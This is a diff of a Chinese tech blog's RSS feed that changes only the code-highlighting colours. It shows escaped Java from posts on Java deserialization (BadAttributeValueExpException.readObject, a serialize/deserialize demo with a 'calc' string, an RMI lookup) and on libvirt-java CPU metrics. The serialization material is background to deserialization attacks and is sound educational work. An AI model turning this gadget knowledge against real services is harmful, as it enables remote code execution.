+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> (Object val) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">val&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> val &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> &lt;span style="color:#ff79c6">?&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> : val.&lt;span style="color:#50fa7b">toString&lt;/span>();
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Returns the string representing the object.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">toString&lt;/span>() {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> val;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Returns the string representing the object.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">toString&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> val;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(ObjectInputStream ois) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream.&lt;span style="color:#a6e22e">GetField&lt;/span> gf &lt;span style="color:#f92672">=&lt;/span> ois.&lt;span style="color:#a6e22e">readFields&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object valObj &lt;span style="color:#f92672">=&lt;/span> gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;val&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">readObject&lt;/span>(ObjectInputStream ois) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> IOException, ClassNotFoundException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream.&lt;span style="color:#50fa7b">GetField&lt;/span> gf &lt;span style="color:#ff79c6">=&lt;/span> ois.&lt;span style="color:#50fa7b">readFields&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object valObj &lt;span style="color:#ff79c6">=&lt;/span> gf.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>, &lt;span style="color:#ff79c6">null&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (valObj &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> String) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val&lt;span style="color:#f92672">=&lt;/span> valObj;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (System.&lt;span style="color:#a6e22e">getSecurityManager&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Long
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Integer
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Float
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Double
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Byte
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Short
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Boolean) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> valObj.&lt;span style="color:#a6e22e">toString&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> { &lt;span style="color:#75715e">// the serialized object is from a version without JDK-8019292 fix&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> System.&lt;span style="color:#a6e22e">identityHashCode&lt;/span>(valObj) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> valObj.&lt;span style="color:#a6e22e">getClass&lt;/span>().&lt;span style="color:#a6e22e">getName&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> String) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val&lt;span style="color:#ff79c6">=&lt;/span> valObj;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (System.&lt;span style="color:#50fa7b">getSecurityManager&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Long
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Integer
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Float
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Double
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Byte
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Short
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Boolean) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> valObj.&lt;span style="color:#50fa7b">toString&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> { &lt;span style="color:#6272a4">// the serialized object is from a version without JDK-8019292 fix&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> System.&lt;span style="color:#50fa7b">identityHashCode&lt;/span>(valObj) &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> valObj.&lt;span style="color:#50fa7b">getClass&lt;/span>().&lt;span style="color:#50fa7b">getName&lt;/span>();
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
@@ -237,139 +237,139 @@ Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
 &lt;h2 id="java-中的序列化">Java 中的序列化&lt;/h2>
 &lt;p>Java 自身提供了序列化的功能，需要实现 &lt;code>java.io.Serializable&lt;/code> 接口，标明该对象是可序列化的。 &lt;code>java.io.Serializable&lt;/code> 是一个空接口，不需要对象实现方法。&lt;/p>
 &lt;p>以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.*;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.nio.charset.StandardCharsets;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.Base64;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.*;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.nio.charset.StandardCharsets;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.Base64;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval0&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval0&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Command&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Serializable {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> String cmd;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Command&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">implements&lt;/span> Serializable {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> String cmd;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">getCmd&lt;/span>() {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> cmd;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">getCmd&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> cmd;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setCmd&lt;/span>(String cmd) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> cmd;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">setCmd&lt;/span>(String cmd) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">cmd&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> cmd;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 定义一个对象&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Command command &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Command();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command.&lt;span style="color:#a6e22e">setCmd&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;calc&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;序列化前: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> command.&lt;span style="color:#a6e22e">getCmd&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 定义一个对象&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Command command &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Command();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command.&lt;span style="color:#50fa7b">setCmd&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;calc&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;序列化前: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> command.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将用户序列化为字节数组&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayOutputStream buffer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayOutputStream();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> (ObjectOutputStream outputStream &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream(buffer)) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputStream.&lt;span style="color:#a6e22e">writeObject&lt;/span>(command);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将用户序列化为字节数组&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayOutputStream buffer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayOutputStream();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectOutputStream outputStream &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectOutputStream(buffer)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputStream.&lt;span style="color:#50fa7b">writeObject&lt;/span>(command);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> String data &lt;span style="color:#f92672">=&lt;/span> Base64.&lt;span style="color:#a6e22e">getEncoder&lt;/span>().&lt;span style="color:#a6e22e">encodeToString&lt;/span>(buffer.&lt;span style="color:#a6e22e">toByteArray&lt;/span>());
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;序列化后: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> data);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> String data &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getEncoder&lt;/span>().&lt;span style="color:#50fa7b">encodeToString&lt;/span>(buffer.&lt;span style="color:#50fa7b">toByteArray&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;序列化后: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> data);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将base64编码的数据再解码为字节数组&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bytes &lt;span style="color:#f92672">=&lt;/span> Base64.&lt;span style="color:#a6e22e">getDecoder&lt;/span>().&lt;span style="color:#a6e22e">decode&lt;/span>(data.&lt;span style="color:#a6e22e">getBytes&lt;/span>(StandardCharsets.&lt;span style="color:#a6e22e">UTF_8&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将base64编码的数据再解码为字节数组&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">byte&lt;/span>&lt;span style="color:#ff79c6">[]&lt;/span> bytes &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getDecoder&lt;/span>().&lt;span style="color:#50fa7b">decode&lt;/span>(data.&lt;span style="color:#50fa7b">getBytes&lt;/span>(StandardCharsets.&lt;span style="color:#50fa7b">UTF_8&lt;/span>));
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将字节数组反序列化为对象&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream b &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayInputStream(bytes);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> (ObjectInputStream input &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream(b)) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> Command obj &lt;span style="color:#f92672">=&lt;/span> (Command) input.&lt;span style="color:#a6e22e">readObject&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;反序列化: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> obj.&lt;span style="color:#a6e22e">getCmd&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将字节数组反序列化为对象&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream b &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayInputStream(bytes);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectInputStream input &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectInputStream(b)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> Command obj &lt;span style="color:#ff79c6">=&lt;/span> (Command) input.&lt;span style="color:#50fa7b">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;反序列化: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> obj.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行后输出：&lt;/p></description></item><item><title>使用libvirt-java采集KVM虚拟机状态信息</title><link>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</link><pubDate>Wed, 19 May 2021 20:18:20 +0800</pubDate><guid>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</guid><description>&lt;p>虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 &lt;code>libvirt-java&lt;/code> 来采集KVM虚拟机的资源使用信息。&lt;/p>
 &lt;h3 id="cpu使用率">CPU使用率&lt;/h3>
 &lt;p>&lt;code>libvirt&lt;/code>并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>usage = (cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>time&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>now - cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>time&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>t&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>second&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>ago) * 100 / (t * vCpus * 10&lt;span style="color:#8be9fd;font-style:italic">^&lt;/span>9)
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Java代码如下&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// t秒前的CPU时间&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> c1 &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getInfo&lt;/span>().&lt;span style="color:#a6e22e">cpuTime&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Thread.&lt;span style="color:#a6e22e">sleep&lt;/span>(1000);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 当前CPU时间&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> c2 &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getInfo&lt;/span>().&lt;span style="color:#a6e22e">cpuTime&lt;/span>;
